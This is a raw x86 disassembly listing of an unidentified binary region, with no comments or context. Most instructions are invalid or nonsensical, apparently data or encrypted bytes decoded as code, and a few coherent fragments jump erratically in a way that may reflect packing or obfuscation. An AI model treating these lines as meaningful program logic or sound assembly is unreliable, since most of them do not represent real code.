  4059d3:	and    edi,DWORD PTR [edi]
  4059d5:	pop    esp
  4059d6:	nop
  4059d7:	or     BYTE PTR [ebx+eax*1],cl
  4059da:	je     0x405a33
  4059dc:	jg     0x405985
  4059de:	push   eax
  4059df:	pop    es
  4059e0:	(bad)  
  4059e1:	int3   
  4059e2:	(bad)  
  4059e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059e4:	pop    edx
  4059e5:	ja     0x405a04
  4059e7:	mov    edx,0xf460488
  4059ec:	dec    esi
  4059ed:	cmp    esp,DWORD PTR [ebp-0x28]
  4059f0:	into   
  4059f1:	push   cs
  4059f2:	cld    
  4059f3:	xchg   edi,eax
  4059f4:	(bad)  
  4059f5:	daa    
  4059f6:	inc    eax
  4059f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059f8:	and    eax,0xb41223d1
  4059fd:	les    esi,FWORD PTR ds:0x73e702d0
  405a03:	mov    ebx,0xa9071301
  405a08:	nop
  405a09:	int    0xe6
  405a0b:	jp     0x405a05
  405a0d:	mov    ch,0x59
  405a0f:	cli    
  405a10:	outs   dx,BYTE PTR ds:[esi]
  405a11:	jmp    0x989c:0x7c2f850
  405a18:	lods   al,BYTE PTR ds:[esi]
  405a19:	jbe    0x405a8b
  405a1b:	fwait
  405a1c:	cmp    al,BYTE PTR [ebx]
  405a1e:	cli    
  405a1f:	jae    0x4059be
  405a21:	jle    0x4059e0
  405a23:	cmp    cl,ch
  405a25:	or     eax,0x1d0c6b05
  405a2a:	mov    DWORD PTR [esi+0x756915eb],ebx
  405a30:	enter  0xe9f3,0x86
  405a34:	vdivsd xmm0,xmm4,QWORD PTR [ebx+0x43bf74b9]
  405a3c:	sahf   
  405a3d:	gs popf 
  405a3f:	imul   BYTE PTR [ebx+0x2017ca14]
  405a45:	inc    ecx
  405a46:	push   DWORD PTR [eax+0x133ba7fa]
  405a4c:	test   DWORD PTR [ebx+0x5b],ebx
  405a4f:	or     ah,BYTE PTR [ebp-0x61]
  405a52:	jl     0x405a7a
  405a54:	jnp    0x4059df
  405a56:	addr16 dec esp
  405a58:	fisub  WORD PTR [ebx-0x20]
  405a5b:	jbe    0x4059e6
  405a5d:	iret   
  405a5e:	pop    ebx
  405a5f:	and    DWORD PTR [edx-0xe],edx
  405a62:	pop    ds
  405a63:	xor    ch,BYTE PTR [edx]
  405a65:	push   eax
  405a66:	cmp    ebx,DWORD PTR [eax+0x67]
  405a69:	cwde   
  405a6a:	(bad)  
  405a6b:	lods   al,BYTE PTR ds:[esi]
  405a6c:	dec    ecx
  405a6d:	lea    ecx,fs:[ebp-0x505858ad]
  405a74:	lea    eax,ds:0xc6be0dfa
  405a7a:	push   ebx
  405a7b:	ds add dl,bl
  405a7e:	ins    DWORD PTR es:[edi],dx
  405a7f:	dec    esi
  405a80:	add    al,0x21
  405a82:	xchg   esi,eax
  405a83:	push   ebx
  405a84:	jl     0x405a53
  405a86:	pop    ds
  405a87:	sub    DWORD PTR [ecx-0x1a156b4c],edx
  405a8d:	push   cs
  405a8e:	sbb    al,0x67
  405a90:	mov    ebp,0xe2e4b0e6
  405a95:	pop    ecx
  405a96:	xchg   ebx,eax
  405a97:	retf   
  405a98:	mov    ds:0xa165ce8f,eax
  405a9d:	sbb    al,0x79
  405a9f:	add    bh,BYTE PTR [ebx+0x62]
  405aa2:	jns    0x405b18
  405aa4:	aam    0x51
  405aa6:	push   eax
  405aa7:	xchg   edx,eax
  405aa8:	loop   0x405afc
  405aaa:	imul   ecx,ebp,0xffffffcb
  405aad:	(bad)  
  405aae:	sbb    edx,ecx
  405ab0:	sahf   
  405ab1:	jmp    0x405a86
  405ab3:	or     BYTE PTR [esi],ch
  405ab5:	rol    DWORD PTR ds:0x7d5fbe31,cl
  405abb:	push   esp
  405abc:	ins    BYTE PTR es:[edi],dx
  405abd:	test   DWORD PTR [esi+eiz*1-0x76],0x1a9930b1
  405ac5:	push   0xffffffdf
  405ac7:	xor    cl,BYTE PTR [ecx+0x20087d8f]
  405acd:	aam    0xd8
  405acf:	daa    
  405ad0:	xchg   DWORD PTR [ebp-0x67189812],esi
  405ad6:	and    ebp,DWORD PTR [edx]
  405ad8:	or     DWORD PTR [ecx],0x6db6e99f
  405ade:	push   cx
  405ae0:	cdq    
  405ae1:	cmp    ebx,ecx
  405ae3:	sub    eax,0x48ebf517
  405ae8:	outs   dx,DWORD PTR ds:[esi]
  405ae9:	jne    0x405b25
  405aeb:	nop
  405aec:	jl     0x405b57
  405aee:	add    DWORD PTR [eax+0x49],0x2b77f0a9
  405af5:	pop    eax
  405af6:	sub    DWORD PTR [ecx+0x75],edx
  405af9:	add    al,0x73
  405afb:	xchg   esp,eax
  405afc:	pop    esp
  405afd:	rcl    BYTE PTR [bx+di],0xf
  405b01:	and    eax,0x6e8aaa01
  405b06:	xor    eax,0x28e0cf3f
  405b0b:	les    ebp,FWORD PTR [esi+0x58]
  405b0e:	pop    ds
  405b0f:	test   eax,0x59162b
  405b14:	or     DWORD PTR [esi-0x7d],0xffffff83
  405b18:	add    BYTE PTR [ecx+ecx*1],ch
  405b1b:	dec    edi
  405b1c:	and    DWORD PTR [edi],esi
  405b1e:	dec    eax
  405b1f:	pop    edx
  405b20:	lea    esi,[edi]
  405b22:	xor    bh,BYTE PTR [edx-0x49]
  405b25:	sbb    BYTE PTR [ecx+0x7],cl
  405b28:	mov    eax,esp
  405b2a:	and    ebp,DWORD PTR [eax]
  405b2c:	sub    eax,0xaa48a923
  405b31:	fisub  WORD PTR [ecx]
  405b33:	pop    esi
  405b34:	repz mov ah,0x28
  405b37:	out    0x5d,eax
  405b39:	test   al,0xbd
  405b3b:	rol    DWORD PTR [edx],0x40
  405b3e:	sub    ebx,eax
  405b40:	into   
  405b41:	pop    esp
  405b42:	pop    ss
  405b43:	shl    DWORD PTR [ecx-0x2f],cl
  405b46:	pop    esp
  405b47:	sbb    BYTE PTR [ebx-0x2cffe8e5],ch
  405b4d:	adc    edi,esi
  405b4f:	sbb    al,0xcd
  405b51:	imul   edi,DWORD PTR [edx+0x2d4ed5f8],0x29c19a86
  405b5b:	scas   eax,DWORD PTR es:[edi]
  405b5c:	pop    eax
  405b5d:	out    dx,eax
  405b5e:	loope  0x405bc8
  405b60:	or     ch,BYTE PTR [ebp-0x30]
  405b63:	fsub   st,st(0)
  405b65:	stos   DWORD PTR es:[edi],eax
  405b66:	into   
  405b67:	lock out dx,al
  405b69:	ss gs ins BYTE PTR es:[edi],dx
  405b6c:	jge    0x405b9a
  405b6e:	and    al,0xbe
  405b70:	adc    DWORD PTR [ecx+0x78],edx
  405b73:	cld    
  405b74:	xchg   BYTE PTR [edi+ebp*8-0x2f],al
  405b78:	daa    
  405b79:	jecxz  0x405b41
  405b7b:	and    BYTE PTR [edx],ah
  405b7d:	adc    BYTE PTR ds:0xa6b71928,al
  405b83:	(bad)  
  405b84:	xchg   edi,eax
  405b85:	push   ecx
  405b86:	outs   dx,DWORD PTR ds:[esi]
  405b87:	ds jecxz 0x405b8a
  405b8a:	and    DWORD PTR [eax+0x6d32b68d],ebp
  405b90:	add    al,0x8b
  405b92:	adc    eax,0x6caac859
  405b97:	sub    DWORD PTR [edx],eax
  405b99:	fidivr WORD PTR [esi-0x139ed21]
  405b9f:	ss cld 
  405ba1:	fadd   DWORD PTR [ebp+ebx*1-0x47640ad2]
  405ba8:	sbb    eax,0x1abf1bd
  405bad:	aad    0x30
  405baf:	enter  0x902f,0x90
  405bb3:	sub    eax,0xe4d040e9
  405bb8:	ss cli 
  405bba:	adc    cl,ah
  405bbc:	call   0x97e0:0x8bc8598b
  405bc3:	sub    eax,ebp
  405bc5:	stos   DWORD PTR es:[edi],eax
  405bc6:	mov    ch,0x39
  405bc8:	push   ss
  405bc9:	jnp    0x405b8c
  405bcb:	test   DWORD PTR [esi-0x43],edi
  405bce:	xor    BYTE PTR [edi+eax*1+0x3c66b6da],dh
  405bd5:	repz (bad) 
  405bd9:	xor    al,0x53
  405bdb:	out    dx,al
  405bdc:	pop    eax
  405bdd:	in     al,0x45
  405bdf:	test   al,0xee
  405be1:	lahf   
  405be2:	push   esp
  405be3:	les    esp,FWORD PTR [edx+0x7f41e4ac]
  405be9:	loopne 0x405c1d
  405beb:	scas   eax,DWORD PTR es:[edi]
  405bec:	sbb    DWORD PTR [eax+0x45324536],edi
  405bf2:	add    ecx,DWORD PTR [edx+edi*1-0x283c00e2]
  405bf9:	mov    edi,0xe54097d2
  405bfe:	mov    edx,0xe4665e6d
  405c03:	add    esp,esp
  405c05:	xchg   esi,eax
  405c06:	(bad)  
  405c07:	and    DWORD PTR [edi],esi
  405c09:	(bad)  
  405c0a:	in     eax,dx
  405c0b:	cmp    cl,BYTE PTR [eax]
  405c0d:	pop    edx
  405c0e:	dec    edx
  405c0f:	ja     0x405bd0
  405c11:	xor    al,0xa4
  405c13:	push   ebx
  405c14:	xchg   edx,eax
  405c15:	xor    ah,BYTE PTR [edx-0x7ae29730]
  405c1b:	fldcw  WORD PTR ds:0xb4c6a19
  405c21:	cmp    eax,esi
  405c23:	sahf   
  405c24:	sbb    BYTE PTR [ebx+0x4864b91c],bh
  405c2a:	mov    DWORD PTR [ebx+ebx*1],eax
  405c2d:	push   ds
  405c2e:	xchg   DWORD PTR [ebx],edi
  405c30:	mov    WORD PTR [edx+0x30ed64b7],gs
  405c36:	inc    esp
  405c37:	push   0xffffffa7
  405c39:	ds je  0x405cb9
  405c3c:	push   es
  405c3d:	jno    0x405c16
  405c3f:	sub    ecx,DWORD PTR [ecx+0x4a]
  405c42:	mov    ebx,ecx
  405c44:	inc    esp
  405c45:	mov    ch,0x6d
  405c47:	lds    ecx,FWORD PTR [edx+0x18]
  405c4a:	push   ebp
  405c4b:	(bad)  
  405c4c:	dec    bp
  405c4e:	pop    ss
  405c4f:	sbb    edi,DWORD PTR [ebx]
  405c51:	pusha  
  405c52:	push   esi
  405c53:	adc    ebp,esi
  405c55:	iret   
  405c56:	sti    
  405c57:	push   es
  405c58:	push   di
  405c5a:	mov    cl,0xa6
  405c5c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c5e:	and    eax,0xf78102ed
  405c63:	sbb    esp,eax
  405c65:	adc    BYTE PTR [ecx],cl
  405c67:	mov    cl,0x7d
  405c69:	lods   eax,DWORD PTR ds:[esi]
  405c6a:	not    DWORD PTR [esi+0x64]
  405c6d:	add    ah,BYTE PTR [eax-0x47]
  405c70:	test   BYTE PTR [ecx-0x1b],dl
  405c73:	cmp    BYTE PTR [edi],al
  405c75:	cmp    ebp,DWORD PTR [esi+0xb529134]
  405c7b:	or     DWORD PTR [esi+ebp*8-0x51],0xc09e53d8
  405c83:	pop    edi
  405c84:	repnz push 0xffffff98
  405c87:	aas    
  405c88:	dec    eax
  405c89:	jmp    0x108d22ab
  405c8e:	pusha  
  405c8f:	in     al,0x40
  405c91:	adc    al,0x9b
  405c93:	xlat   BYTE PTR ds:[ebx]
  405c94:	cmp    DWORD PTR [edi-0x27b94d45],esp
  405c9a:	or     eax,DWORD PTR [eax-0x72]
  405c9d:	dec    esi
  405c9e:	add    esp,ebp
  405ca0:	repnz push es
  405ca2:	stc    
  405ca3:	and    DWORD PTR [ebp+0x1c86e39e],0x838c3d5e
  405cad:	cli    
  405cae:	sub    dh,BYTE PTR ds:0xf09f3deb
  405cb4:	sahf   
  405cb5:	sub    al,bh
  405cb7:	ret    0x38d
  405cba:	sub    eax,0x5bb17d09
  405cbf:	mov    edx,0x7bdbd8da
  405cc4:	sub    al,0x81
  405cc6:	sub    BYTE PTR [ebp+0x1e],dh
  405cc9:	mov    al,0x81
  405ccb:	sbb    edi,DWORD PTR [ebx+0xd]
  405cce:	into   
  405ccf:	jp     0x405cb6
  405cd1:	sar    DWORD PTR [edx+0x3],0x2a
  405cd5:	(bad)  
  405cd6:	sub    DWORD PTR [eax+0x2b519c10],edi
  405cdc:	inc    ebp
  405cdd:	and    dl,BYTE PTR [edi-0x65]
  405ce0:	adc    ah,al
  405ce2:	jge    0x405cc8
  405ce4:	add    eax,0x96d08447
  405ce9:	and    BYTE PTR [edi],0x64
  405cec:	dec    ecx
  405ced:	dec    ebp
  405cee:	aam    0x60
  405cf0:	sub    eax,esp
  405cf2:	jg     0x405ce2
  405cf4:	stos   BYTE PTR es:[edi],al
  405cf5:	push   ds
  405cf6:	mov    dl,BYTE PTR [ebx+edi*2]
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	sub    esp,DWORD PTR [eax]
  405d2d:	pop    eax
  405d2e:	mov    dh,0x2f
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d5c
  405d38:	outs   dx,BYTE PTR ds:[esi]
  405d39:	sbb    al,0x37
  405d3b:	ins    DWORD PTR es:[edi],dx
  405d3c:	adc    ah,dl
  405d3e:	fs mov edi,0xcaafd3c3
  405d44:	ins    BYTE PTR es:[edi],dx
  405d45:	mov    ds:0xbf621d6b,eax
  405d4a:	leave  
  405d4b:	dec    edi
  405d4c:	pop    ebp
  405d4d:	sar    bl,0x60
  405d50:	das    
  405d51:	test   DWORD PTR [ecx-0x13],eax
  405d54:	and    al,ch
  405d56:	jnp    0x405d0c
  405d58:	lods   al,BYTE PTR ds:[esi]
  405d59:	(bad)  
  405d5a:	jo     0x405d7d
  405d5c:	scas   eax,DWORD PTR es:[edi]
  405d5d:	push   ebx
  405d5e:	pop    esi
  405d5f:	into   
  405d60:	sbb    al,0x70
  405d62:	or     edi,DWORD PTR [eax]
  405d64:	loopne 0x405d15
  405d66:	mov    BYTE PTR [eax],al
  405d68:	mov    eax,0xc14fb3f9
  405d6d:	pop    eax
  405d6e:	cmp    eax,0x23a54398
  405d73:	outs   dx,DWORD PTR ds:[esi]
  405d74:	fld    TBYTE PTR [ecx-0x78bcfb9b]
  405d7a:	xchg   ebx,eax
  405d7b:	dec    ebp
  405d7c:	js     0x405da8
  405d7e:	jnp    0x405dfd
  405d80:	mov    edi,0x12d78ab4
  405d85:	int3   
  405d86:	shr    ebp,cl
  405d88:	mov    ecx,0x174c567
  405d8d:	nop
  405d8e:	call   DWORD PTR [esi+ebx*2-0x6b7d1459]
  405d95:	pop    edx
  405d96:	xchg   ecx,eax
  405d97:	push   edx
  405d98:	dec    edx
  405d99:	(bad)  
  405d9a:	ins    DWORD PTR es:[edi],dx
  405d9b:	loopne 0x405e17
  405d9d:	enter  0x78b1,0xe0
  405da1:	rol    ch,cl
  405da3:	mov    ebp,0x515c1557
  405da8:	aas    
  405da9:	xor    DWORD PTR [edx-0x535de85f],ebx
  405daf:	pop    esp
  405db0:	ins    BYTE PTR es:[edi],dx
  405db1:	fisubr WORD PTR [edx-0x69c59241]
  405db7:	out    0xc9,al
  405db9:	test   eax,0x7879a2bc
  405dbe:	aaa    
  405dbf:	fisub  DWORD PTR [edi-0x4542ba6a]
  405dc5:	imul   edx,edx,0xd4defad7
  405dcb:	scas   al,BYTE PTR es:[edi]
  405dcc:	call   0x3fdcbaf3
  405dd1:	or     eax,0x785058dd
  405dd6:	sbb    al,BYTE PTR [edi+edi*1]
  405dd9:	mov    ebp,0x121ea284
  405dde:	mov    WORD PTR [eax+0x4ea7c20c],es
  405de4:	or     eax,0xd6eae8a5
  405de9:	ss leave 
  405deb:	push   esi
  405dec:	jns    0x405d78
  405dee:	ins    DWORD PTR es:[edi],dx
  405def:	pop    es
  405df0:	jecxz  0x405e66
  405df2:	push   ss
  405df3:	movups xmm1,xmm5
  405df6:	xchg   edi,eax
  405df7:	mov    ds:0xb7340da2,eax
  405dfc:	test   eax,esi
  405dfe:	in     al,dx
  405dff:	aam    0xe3
  405e01:	dec    edx
  405e02:	mov    eax,ds:0xf353b9ba
  405e07:	addr16 mov eax,0x40e33184
  405e0d:	xor    eax,0x6199ed0d
  405e12:	mov    dh,0xc4
  405e14:	mov    ebx,0xce9f3235
  405e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1a:	arpl   WORD PTR [edi+0xe5cb2cb],cx
  405e20:	dec    eax
  405e21:	jmp    0x405e19
  405e23:	call   FWORD PTR [ebx-0x72]
  405e26:	cwde   
  405e27:	fisub  WORD PTR [ebx]
  405e29:	pop    esp
  405e2a:	test   eax,0x56f6817a
  405e2f:	mov    cl,0x5b
  405e31:	jle    0x405e5c
  405e33:	xor    ecx,edx
  405e35:	sub    al,0x16
  405e37:	ss jecxz 0x405de2
  405e3a:	stos   DWORD PTR es:[edi],eax
  405e3b:	mov    ebx,ecx
  405e3d:	rcr    ebx,cl
  405e3f:	lods   al,BYTE PTR ds:[esi]
  405e40:	and    eax,0x52f3eb3f
  405e45:	mov    bh,0x71
  405e47:	xchg   esi,eax
  405e48:	(bad)  
  405e49:	pushf  
  405e4a:	in     al,0x7
  405e4c:	shr    eax,0x19
  405e4f:	lock dec ebx
  405e51:	sub    edi,DWORD PTR [eax+0x7cb93b0c]
  405e57:	loop   0x405e2e
  405e59:	call   0xafd5:0x5c1cd04a
  405e60:	dec    ebp
  405e61:	push   ss
  405e62:	xchg   ebx,eax
  405e63:	and    eax,0xd826495c
  405e68:	nop
  405e69:	xor    eax,0xd9e77829
  405e6e:	mov    DWORD PTR [eax+0x49a906d1],ecx
  405e74:	scas   eax,DWORD PTR es:[edi]
  405e75:	adc    BYTE PTR [esi-0x3c],0x38
  405e79:	(bad)  
  405e7a:	push   ds
  405e7b:	jne    0x405e2e
  405e7d:	int    0x94
  405e7f:	scas   al,BYTE PTR es:[edi]
  405e80:	xchg   ebx,eax
  405e81:	dec    esi
  405e82:	mov    ds:0xdd1ed873,eax
  405e87:	push   es
  405e88:	popf   
  405e89:	adc    ch,BYTE PTR [ebx+0x76db64af]
  405e8f:	push   es
  405e90:	or     al,0x6b
  405e92:	pop    ecx
  405e93:	dec    edx
  405e94:	mov    esp,edi
  405e96:	cld    
  405e97:	xchg   edi,eax
  405e98:	retf   
  405e99:	shl    BYTE PTR [ecx],1
  405e9b:	cmp    eax,DWORD PTR [ebx]
  405e9d:	adc    cl,BYTE PTR [edi-0x4]
  405ea0:	xchg   esp,eax
  405ea1:	rol    DWORD PTR [ecx-0x51],0xde
  405ea5:	nop
  405ea6:	mov    ch,0x2d
  405ea8:	mov    WORD PTR [ebp-0x48],cs
  405eab:	xchg   ecx,eax
  405eac:	jecxz  0x405efc
  405eae:	call   0xc8c6158c
  405eb3:	cmp    BYTE PTR [ecx+0x6fda1e50],al
  405eb9:	push   esi
  405eba:	push   0x697bc2c6
  405ebf:	fdiv   st(4),st
  405ec1:	(bad)  
  405ec2:	pop    esp
  405ec3:	or     DWORD PTR [ebp-0x27a94939],ebx
  405ec9:	fwait
  405eca:	push   esp
  405ecb:	(bad)  
  405ecc:	js     0x405efa
  405ece:	xor    ebp,ebp
  405ed0:	xlat   BYTE PTR ds:[ebx]
  405ed1:	mov    ds:0xe37fcb7e,eax
  405ed6:	imul   esp,DWORD PTR [edx],0xffffffba
  405ed9:	or     edx,DWORD PTR [ecx-0x3c57bb3e]
  405edf:	sbb    dl,BYTE PTR [ecx+0x7c]
  405ee2:	gs mov ecx,0x1623fd37
  405ee8:	lock mov ecx,cs
  405eeb:	pop    eax
  405eec:	adc    DWORD PTR [ebx],edx
  405eee:	lods   al,BYTE PTR ds:[esi]
  405eef:	xchg   esi,eax
  405ef0:	and    ecx,0x2bf134ae
  405ef6:	or     eax,0x55adcb57
  405efb:	ffreep st(2)
  405efd:	mov    cl,0xba
  405eff:	pusha  
  405f00:	adc    BYTE PTR [ebx],bh
  405f02:	scas   al,BYTE PTR es:[edi]
  405f03:	mov    al,0x53
  405f05:	bound  eax,QWORD PTR [edx]
  405f07:	into   
  405f08:	ret    
  405f09:	cmp    esp,DWORD PTR [ebx+0x76]
  405f0c:	mov    eax,ds:0x95bf5d63
  405f11:	daa    
  405f12:	and    edi,esp
  405f14:	loopne 0x405e9d
  405f16:	mov    edi,0x48974c31
  405f1b:	mov    dl,0xa1
  405f1d:	jae    0x405f4c
  405f1f:	xchg   ecx,eax
  405f20:	jl     0x405f4a
  405f22:	sub    BYTE PTR [edx],0xa
  405f25:	lods   eax,DWORD PTR ds:[esi]
  405f26:	in     eax,0x50
  405f28:	int    0xab
  405f2a:	sub    ebx,eax
  405f2c:	xor    esi,DWORD PTR [ebx]
  405f2e:	pushf  
  405f2f:	mov    ebp,0xa8db3a20
  405f34:	add    ebp,esp
  405f36:	ds inc edi
  405f38:	sub    ebx,DWORD PTR [edi+0x628d9775]
  405f3e:	adc    cl,BYTE PTR [eax]
  405f40:	ins    DWORD PTR es:[edi],dx
  405f41:	sbb    esp,DWORD PTR [ebx]
  405f43:	je     0x405f84
  405f45:	ud1    esi,DWORD PTR [esi+0x7d]
  405f49:	mov    gs,ebx
  405f4b:	mov    ds:0xa7579737,eax
  405f50:	dec    ebx
  405f51:	mov    ch,0xec
  405f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f54:	lahf   
  405f55:	pop    edx
  405f56:	pusha  
  405f57:	cmc    
  405f58:	mov    dh,0x72
  405f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f5b:	sub    BYTE PTR [ebp-0xc95c066],al
  405f61:	mov    al,ds:0xcc5eedf9
  405f66:	xor    BYTE PTR [edx+edx*2-0xf],ch
  405f6a:	dec    esp
  405f6b:	jbe    0x405f39
  405f6d:	push   ss
  405f6e:	mov    ds:0xddd1f478,eax
  405f73:	xor    BYTE PTR [edi],bh
  405f75:	dec    edx
  405f76:	xchg   BYTE PTR fs:[edx-0x3eeabf16],dl
  405f7d:	dec    esp
  405f7e:	cmp    DWORD PTR [edi+0x7a],0x21
  405f82:	mov    bh,0x9d
  405f84:	sti    
  405f85:	lds    ebx,FWORD PTR [edi-0x4567c0ad]
  405f8b:	pop    eax
  405f8c:	dec    edx
  405f8d:	add    BYTE PTR ds:0x7fff61cf,bl
  405f93:	pushf  
  405f94:	test   al,0x2e
  405f96:	inc    edx
  405f97:	test   ebp,edx
  405f99:	xor    eax,0x88e623c
  405f9e:	mov    ?,edi
  405fa0:	xor    ebp,0x9ef358b3
  405fa6:	xchg   ebp,eax
  405fa7:	inc    edx
  405fa8:	or     ecx,ecx
  405faa:	push   ss
  405fab:	pop    ss
  405fac:	scas   eax,DWORD PTR es:[edi]
  405fad:	jmp    0x405f3b
  405faf:	rcr    edi,0xa9
  405fb2:	adc    edx,ecx
  405fb4:	fld    TBYTE PTR [ebp+0x12]
  405fb7:	mov    BYTE PTR [edi-0x432b740],ah
  405fbd:	fistp  WORD PTR [esi]
  405fbf:	fcom   DWORD PTR [ebx-0xd]
  405fc2:	inc    eax
  405fc3:	adc    BYTE PTR [ebx+esi*1],bh
  405fc6:	mov    edi,0x5329c755
  405fcb:	call   0xdfa61753
  405fd0:	in     al,0x69
  405fd2:	jne    0x40602d
  405fd4:	jnp    0x406053
  405fd6:	pop    esp
  405fd7:	inc    eax
  405fd8:	cmc    
  405fd9:	adc    BYTE PTR [edx+ebp*8+0x15bb3bb3],al
  405fe0:	enter  0x672a,0x5
  405fe4:	test   eax,0x9e41d30c
  405fe9:	jbe    0x406033
  405feb:	in     eax,dx
  405fec:	test   eax,0xbaaf1d96
  405ff1:	jmp    0x405fab
  405ff3:	bound  ebx,QWORD PTR ds:0x8c9f2c6b
  405ff9:	pop    ebp
  405ffa:	add    dh,cl
  405ffc:	shr    DWORD PTR [ecx+0xd],cl
  405fff:	push   eax
  406000:	add    DWORD PTR [esi-0x4ef4eae4],ebx
  406006:	cld    
  406007:	dec    edx
  406008:	aad    0x17
  40600a:	lahf   
  40600b:	or     eax,0x8d14808c
  406010:	enter  0x7529,0xb2
  406014:	and    DWORD PTR ds:0xc2092895,ebx
  40601a:	sub    al,0xa9
  40601c:	fdiv   QWORD PTR [edx]
  40601e:	sbb    al,0xdf
  406020:	mov    ecx,fs
  406022:	add    BYTE PTR [esi+ebp*1],al
  406025:	cmp    esp,edi
  406027:	clc    
  406028:	push   ss
  406029:	rcl    BYTE PTR [esi+0x39],0xcb
  40602d:	jns    0x405fe4
  40602f:	jmp    0x2c05bca1
  406034:	mov    esp,0xfeb5d4cd
  406039:	int    0x9
  40603b:	sub    al,0x57
  40603d:	out    0x54,al
  40603f:	mov    al,0x61
  406041:	dec    ebp
  406042:	es push 0x17
  406045:	xchg   esp,eax
  406046:	rol    ah,1
  406048:	cs mov al,0x85
  40604b:	lods   eax,DWORD PTR ds:[esi]
  40604c:	push   edx
  40604d:	les    eax,FWORD PTR [edx]
  40604f:	pop    ecx
  406050:	and    al,0x5c
  406052:	cmp    dh,BYTE PTR [eax+0x58b94157]
  406058:	sub    eax,0xeafa7c69
  40605d:	dec    esp
  40605e:	mov    gs,ebp
  406060:	xchg   ecx,eax
  406061:	popf   
  406062:	hlt    
  406063:	and    DWORD PTR [ecx-0x6f6e1bd2],ebp
  406069:	pop    edi
  40606a:	ret    0xcf44
  40606d:	mov    dl,0xd7
  40606f:	sub    cl,BYTE PTR [esp+edx*8]
  406072:	jae    0x406030
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x82
  40608b:	dec    eax
  40608c:	mov    ecx,0x7e3de0d2
  406091:	jle    0x4060c6
  406093:	jge    0x406113
  406095:	jle    0x4060d9
  406097:	mov    WORD PTR [ecx],fs
  406099:	daa    
  40609a:	push   0x9e8f51a3
  40609f:	sbb    dl,dh
  4060a1:	sbb    BYTE PTR [edi-0x33],ch
  4060a4:	(bad)  
  4060a5:	clc    
  4060a6:	ins    BYTE PTR es:[edi],dx
  4060a7:	mov    DWORD PTR [esi],0x7c592da4
  4060ad:	shl    BYTE PTR ds:0xd7429019,1
  4060b3:	inc    ecx
  4060b4:	repz push cs
  4060b6:	and    cl,bl
  4060b8:	xchg   BYTE PTR [ebx-0x65ed1af9],dl
  4060be:	fs into 
  4060c0:	ja     0x4060eb
  4060c2:	pusha  
  4060c3:	push   cs
  4060c4:	mov    ch,0xbc
  4060c6:	adc    al,dh
  4060c8:	ins    DWORD PTR es:[edi],dx
  4060c9:	and    BYTE PTR cs:[ebx-0x7],ah
  4060cd:	fldenv [ebp+0x1408512a]
  4060d3:	ja     0x4060b4
  4060d5:	dec    edx
  4060d6:	fmul   DWORD PTR [ebx-0x30]
  4060d9:	(bad)  
  4060db:	xor    eax,eax
  4060dd:	popa   
  4060de:	cmovs  ebx,DWORD PTR [eax+ecx*1]
  4060e2:	cdq    
  4060e3:	cmp    al,0x42
  4060e5:	test   al,0xed
  4060e7:	repz out dx,al
  4060e9:	je     0x4060d0
  4060eb:	sbb    BYTE PTR [eax],0x8e
  4060ee:	and    ebp,DWORD PTR [ebx]
  4060f0:	mov    ds:0x3da98a4f,eax
  4060f5:	cmp    BYTE PTR [esi-0xf7d5796],ah
  4060fb:	lds    edi,FWORD PTR [eax]
  4060fd:	pop    ss
  4060fe:	data16 lods al,BYTE PTR ds:[esi]
  406100:	ds jecxz 0x406176
  406103:	push   ss
  406104:	pop    ds
  406105:	retf   0x327f
  406108:	repz push edi
  40610a:	inc    ebx
  40610b:	call   0xf85f:0xdef29797
  406112:	aad    0x51
  406114:	pushf  
  406115:	xchg   esp,eax
  406116:	push   0x36
  406118:	inc    esi
  406119:	mov    ebp,0xb12a5ff1
  40611e:	pop    esp
  40611f:	and    eax,0xf807d44b
  406124:	jno    0x4060aa
  406126:	test   BYTE PTR ds:0xb2cd4eae,ch
  40612c:	cmc    
  40612d:	fdivp  st(7),st
  40612f:	stos   DWORD PTR es:[edi],eax
  406130:	jmp    0x9838:0xe8378598
  406137:	dec    edx
  406138:	cli    
  406139:	adc    esi,ecx
  40613b:	test   DWORD PTR [esi+0x64],0xb9369c8f
  406142:	stos   DWORD PTR es:[edi],eax
  406143:	rol    bl,1
  406145:	xor    al,0x6f
  406147:	outs   dx,DWORD PTR ds:[esi]
  406148:	cmp    BYTE PTR [ebp-0x54],al
  40614b:	mov    eax,ds:0xb7801fd4
  406150:	stc    
  406151:	pop    esi
  406152:	or     WORD PTR [edi],si
  406155:	add    eax,0x5addfc77
  40615a:	rol    BYTE PTR [ebx-0x325b3120],0x81
  406161:	mov    ?,WORD PTR [edx+0x2ad3cc11]
  406167:	xchg   edi,eax
  406168:	sti    
  406169:	mov    WORD PTR [edx-0x47],?
  40616c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616d:	cs xchg edx,eax
  40616f:	jg     0x4061ae
  406171:	mov    ds:0xe77490f4,al
  406176:	push   eax
  406177:	sub    DWORD PTR [esi+0x11],ecx
  40617a:	aas    
  40617b:	mov    dl,0xaf
  40617d:	cmp    eax,0x272b6fc6
  406182:	int3   
  406183:	mov    ch,0x67
  406185:	(bad)  
  406186:	pop    ecx
  406187:	mov    bl,0x9e
  406189:	nop
  40618a:	icebp  
  40618b:	es xchg ebp,eax
  40618d:	ret    
  40618e:	aas    
